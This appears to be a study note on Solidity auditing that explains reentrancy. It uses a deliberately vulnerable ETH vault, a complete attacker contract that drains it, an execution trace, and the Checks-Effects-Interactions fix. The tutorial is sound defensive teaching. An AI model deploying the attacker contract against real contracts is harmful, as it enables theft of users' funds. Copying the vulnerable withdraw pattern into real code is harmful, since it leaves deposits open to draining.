---
Created: 24-11-2026
Tags:
  - web3
  - solidity
  - fundamentals
---

To spot vulnerabilities in DeFi protocols, you need to read Solidity like an attacker: tracking **state variables**, **access controls**, and **external calls** where control flow leaves the contract.

---

## 1. Anatomy of a Basic Vault Contract

Below is a minimal ETH Vault. Every line represents a core building block you will see in every audit:

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20; // >=0.8.0 has built-in integer overflow/underflow checks

contract VulnerableVault {
    // STATE VARIABLE (stored permanently in EVM Storage)
    // Maps each user's address to their deposited ETH balance (in Wei)
    mapping(address => uint256) public balances;

    // 'payable' allows this function to receive native ETH (msg.value)
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE WITHDRAW FUNCTION
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // 1. INTERACTION: Sends ETH to msg.sender BEFORE updating state!
        // .call{value: amount}("") forwards all available gas and triggers
        // the recipient's receive() / fallback() function if it is a contract.
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");

        // 2. EFFECT: State is updated TOO LATE
        balances[msg.sender] = 0;
    }
}
```

### Key Solidity Concepts in This Snippet

 **Function Visibility:**

- `external`: Callable **only** from outside the contract (cheaper gas because arguments stay in `calldata`).

- `public`: Callable both externally and internally (auto-generates a getter if applied to a state variable like `balances`).

- `internal`: Callable only by this contract and contracts inheriting from it.

- `private`: Callable only within this exact contract (note: data is still **100% visible** on-chain!).

**Sending ETH (`.call` vs `.transfer`/`.send`):**

- `.transfer()` and `.send()` forward a hardcoded **2,300 gas stipend** (often breaks with smart contract wallets/multisigs).

- `recipient.call{value: amount}("")` is the modern standard: it forwards all remaining gas, which means **execution control temporarily hands over to the recipient contract**.

## How Reentrancy Works (Control Flow Hijacking)

When `VulnerableVault` sends ETH via `.call`, if `msg.sender` is a malicious smart contract, its `receive()` function automatically executes **before `withdraw()` finishes**.

Since `balances[msg.sender]` has not been set to `0` yet, the attacker's `receive()` function calls `vault.withdraw()` again—and again—until the vault is drained.

### The Attacker Contract

```js
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVault public immutable vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    // Step 1: Deposit 1 ETH and immediately trigger withdraw()
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    // Step 2: Automatically triggered when the Vault sends ETH via .call()
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(); // Re-enters while balances[attacker] is still 1 ETH!
        }
    }
}
```

**Execution Trace**

- Vault holds `10 ETH` from other users.

- Attacker deposits `1 ETH` -> `balances[attacker] = 1 ETH` (Vault total = `11 ETH`).

- Attacker calls `withdraw()` -> Vault sends `1 ETH` -> triggers `Attacker.receive()`.

- Inside `receive()`, `balances[attacker]` is **still `1 ETH`**. Attacker calls `withdraw()` 10 more times in a loop.

- Vault balance hits `0 ETH`. The loop ends, and `balances[attacker] = 0` finally executes 11 times in reverse.
- 
## The Defense: Checks-Effects-Interactions (CEI) & ReentrancyGuard

To prevent reentrancy across any protocol, enforce two layers of defense:

1. **Checks-Effects-Interactions (CEI Pattern):** Always validate inputs first (**Checks**), update all internal state variables second (**Effects**), and make external calls last (**Interactions**).
    
2. **`ReentrancyGuard` (`nonReentrant` modifier):** Uses a storage lock (`status = 1` -> `status = 2`) that reverts if the function is entered again before finishing.

**Fixed Code**
```js
function withdraw() external {
    // 1. CHECKS
    uint256 amount = balances[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    // 2. EFFECTS (Update state BEFORE external call)
    balances[msg.sender] = 0;

    // 3. INTERACTIONS (External call last)
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "ETH transfer failed");
}
```

## Quick Auditing Checklist for External Calls

-Whenever you see `.call()`, token transfers with callbacks (`ERC-777`, `ERC-721` `safeTransferFrom`, `ERC-1155`), or flash loan callbacks:

- Ask: "Has every state variable (balances, debt, shares) already been updated BEFORE this line?"

- Ask: "Can an attacker re-enter a DIFFERENT function (Cross-Function Reentrancy) that reads stale state while this function is mid-execution?"